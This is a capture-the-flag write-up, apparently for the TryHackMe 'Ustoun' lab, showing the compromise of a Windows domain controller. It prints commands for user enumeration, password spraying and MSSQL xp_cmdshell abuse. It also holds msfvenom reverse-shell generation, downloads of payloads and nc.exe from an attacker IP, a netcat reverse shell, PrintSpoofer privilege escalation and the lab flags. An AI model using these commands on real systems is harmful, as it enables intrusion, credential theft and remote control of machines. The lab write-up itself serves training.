> USTOUN

**export IP=10.10.48.189**

# rustscan

rustscan -a $IP --ulimit=50000 -- -sC -sV -Pn -A | tee rustscan.log


```
53/tcp   open  domain             syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec       syn-ack Microsoft Windows Kerberos (server time: 2021-04-11 13:57:26Z)
135/tcp  open  msrpc              syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap               syn-ack Microsoft Windows Active Directory LDAP (Domain: ustoun.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=ustoun,DC=local
|       ldapServiceName: ustoun.local:dc$@USTOUN.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=ustoun,DC=local
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ustoun,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=ustoun,DC=local
|       namingContexts: DC=ustoun,DC=local
|       namingContexts: CN=Configuration,DC=ustoun,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=ustoun,DC=local
|       namingContexts: DC=DomainDnsZones,DC=ustoun,DC=local
|       namingContexts: DC=ForestDnsZones,DC=ustoun,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 114739
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ustoun,DC=local
|       dnsHostName: DC.ustoun.local
|       defaultNamingContext: DC=ustoun,DC=local
|       currentTime: 20210411140012.0Z
|_      configurationNamingContext: CN=Configuration,DC=ustoun,DC=local
445/tcp  open  microsoft-ds?      syn-ack
464/tcp  open  kpasswd5?          syn-ack
593/tcp  open  ncacn_http         syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped         syn-ack
3268/tcp open  ldap               syn-ack Microsoft Windows Active Directory LDAP (Domain: ustoun.local, Site: 
3269/tcp open  tcpwrapped         syn-ack
3389/tcp open  ssl/ms-wbt-server? syn-ack
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Let's add the DNS computer name  to our `/etc/hosts`.

# Enumerate

We don't have pretty much anything. Let's start with enumerating usernames using kerbrute.

/opt/kerbrute_linux_amd64 userenum --dc dc.ustoun.local -d ustoun.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt

```
2021/04/12 23:52:31 >  [+] VALID USERNAME:	 guest@ustoun.local
2021/04/12 23:53:10 >  [+] VALID USERNAME:	 administrator@ustoun.local
```

We have 2 users here. Let's see guest account and see if it is active using crackmapexec.

crackmapexec smb dc.ustoun.local -u 'guest' -p ''

```
SMB         10.10.71.35     445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.71.35     445    DC               [+] ustoun.local\guest: 
```

Let's try rid (Resource Identifier) bruteforcing. 

crackmapexec smb dc.ustoun.local -u 'guest' -p '' --rid-brute

```
SMB         10.10.71.35     445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.71.35     445    DC               [+] ustoun.local\guest: 
SMB         10.10.71.35     445    DC               [+] Brute forcing RIDs
SMB         10.10.71.35     445    DC               498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.71.35     445    DC               500: DC01\Administrator (SidTypeUser)
SMB         10.10.71.35     445    DC               501: DC01\Guest (SidTypeUser)
SMB         10.10.71.35     445    DC               502: DC01\krbtgt (SidTypeUser)
SMB         10.10.71.35     445    DC               512: DC01\Domain Admins (SidTypeGroup)
SMB         10.10.71.35     445    DC               513: DC01\Domain Users (SidTypeGroup)
SMB         10.10.71.35     445    DC               514: DC01\Domain Guests (SidTypeGroup)
SMB         10.10.71.35     445    DC               515: DC01\Domain Computers (SidTypeGroup)
SMB         10.10.71.35     445    DC               516: DC01\Domain Controllers (SidTypeGroup)
SMB         10.10.71.35     445    DC               517: DC01\Cert Publishers (SidTypeAlias)
SMB         10.10.71.35     445    DC               518: DC01\Schema Admins (SidTypeGroup)
SMB         10.10.71.35     445    DC               519: DC01\Enterprise Admins (SidTypeGroup)
SMB         10.10.71.35     445    DC               520: DC01\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.71.35     445    DC               521: DC01\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.71.35     445    DC               522: DC01\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.71.35     445    DC               525: DC01\Protected Users (SidTypeGroup)
SMB         10.10.71.35     445    DC               526: DC01\Key Admins (SidTypeGroup)
SMB         10.10.71.35     445    DC               527: DC01\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.71.35     445    DC               553: DC01\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.71.35     445    DC               571: DC01\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.71.35     445    DC               572: DC01\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.71.35     445    DC               1000: DC01\DC$ (SidTypeUser)
SMB         10.10.71.35     445    DC               1101: DC01\DnsAdmins (SidTypeAlias)
SMB         10.10.71.35     445    DC               1102: DC01\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.71.35     445    DC               1112: DC01\SVC-Kerb (SidTypeUser)
SMB         10.10.71.35     445    DC               1114: DC01\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

Or we can look up using impacket's `lookupsid.py`. 

`python3 /usr/share/doc/python3-impacket/examples/lookupsid.py guest@$IP` which gives the sam result as above.

From the result we can find 3 users `krbtgt`, `SVC-Kerb`, `DC$`. Let's save them as a file and run crackmapexec to find creds.

crackmapexec smb dc.ustoun.local -u users.txt -p /usr/share/wordlists/rockyou.txt 

```
SMB         10.10.71.35     445    DC               [+] ustoun.local\SVC-Kerb:superman 
```

We can't enter into anything using these creds. Let's again use impacket.

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py SVC-Kerb@$IP

And we are in mssql. Let's try and see if we can run system commands.

EXEC xp_cmdshell 'dir c:' => And it works!! Let's create a directory and put a msfvenom payload there!

## Payload => msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.107.21 LPORT=1234 -f exe > exploit.exe

# Steps

1. EXEC xp_cmdshell 'mkdir C:\priv'
2. EXEC xp_cmdshell 'powershell.exe -c curl http://10.8.107.21:8000/exploit.exe -o C:\priv\exploit.exe'
3. EXEC xp_cmdshell 'C:\priv\exploit.exe'

For some reason it didn't work, so let's transfer nc to the target machine. We got a shell!!

1. EXEC xp_cmdshell 'powershell.exe -c curl http://10.8.107.21:8000/nc.exe -o C:\priv\nc.exe'
2. EXEC xp_cmdshell 'c:\priv\nc.exe -e cmd 10.8.107.21 1234'

Let's check out out privileges.

whoami /priv

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  => OOh!! Printer Spoofer privilege
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

EXEC xp_cmdshell 'powershell.exe -c curl http://10.8.107.21:8000/PrintSpoofer64.exe -o C:\priv\PrintSpoofer64.exe'
PrintSpoofer64.exe -c cmd -i

And we are in as `dc01\dc$`.

# users.txt

```
THM{MSSQL_IS_COOL}
```

# root.txt

```
THM{I_L1kE_gPoS}
```